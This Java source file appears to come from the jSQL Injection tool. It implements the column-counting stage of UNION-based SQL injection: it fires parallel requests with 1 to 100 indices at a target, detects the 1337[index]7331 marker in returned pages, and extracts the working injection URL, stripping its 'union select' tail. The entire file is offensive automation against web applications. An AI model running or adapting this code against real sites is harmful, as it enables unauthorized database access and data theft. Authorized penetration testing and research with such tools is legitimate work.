package com.jsql.model.suspendable;

import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.suspendable.callable.CallablePageSource;
import com.jsql.model.suspendable.callable.ThreadFactoryCallable;

/**
 * Runnable class, search the correct number of fields in the SQL query.
 * Parallelizes the search, provides the stop capability
 */
public class SuspendableGetIndexes extends AbstractSuspendable<String> {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();
    
    public SuspendableGetIndexes(InjectionModel injectionModel) {
        super(injectionModel);
    }

    /**
     * 
     */
    @Override
    public String run(Object... args) throws JSqlException {
        // Parallelize the search
        ExecutorService taskExecutor = Executors.newCachedThreadPool(new ThreadFactoryCallable("CallableGetIndexes"));
        CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        boolean isRequestFound = false;
        String initialQuery = "";
        int nbIndex;

        // SQL: each field is built has the following 1337[index]7330+1
        // Search if the source contains 1337[index]7331, this notation allows to exclude
        // pages that display our own url in the source
        for (nbIndex = 1 ; nbIndex <= 10 ; nbIndex++) {
            taskCompletionService.submit(
                new CallablePageSource(
                    this.injectionModel.getMediatorVendor().getVendor().instance().sqlIndices(nbIndex),
                    this.injectionModel
                )
            );
        }

        try {
            // Start from 10 to 100 requests
            while (!isRequestFound && nbIndex <= 100) {

                if (this.isSuspended()) {
                    throw new StoppedByUserSlidingException();
                }

                CallablePageSource currentCallable = taskCompletionService.take().get();

                // Found a correct mark 1337[index]7331 in the source
                if (Pattern.compile("(?s).*1337\\d+7331.*").matcher(currentCallable.getContent()).matches()) {
                    this.injectionModel.setSrcSuccess(currentCallable.getContent());
                    initialQuery = currentCallable.getUrl().replace("0%2b1", "1");
                    isRequestFound = true;
                } else {
                    // Else add a new index
                    taskCompletionService.submit(
                        new CallablePageSource(
                            this.injectionModel.getMediatorVendor().getVendor().instance().sqlIndices(nbIndex),
                            this.injectionModel
                        )
                    );
                    nbIndex++;
                }
                
            }
            taskExecutor.shutdown();
            taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
        } catch (InterruptedException | ExecutionException e) {
            LOGGER.error("Interruption while determining injection indexes", e);
            Thread.currentThread().interrupt();
        }

        if (isRequestFound) {
            return initialQuery.replaceAll("\\+\\+union\\+select\\+.*?--\\+$", "+");
        }
        
        // TODO optional
        return "";
    }
    
}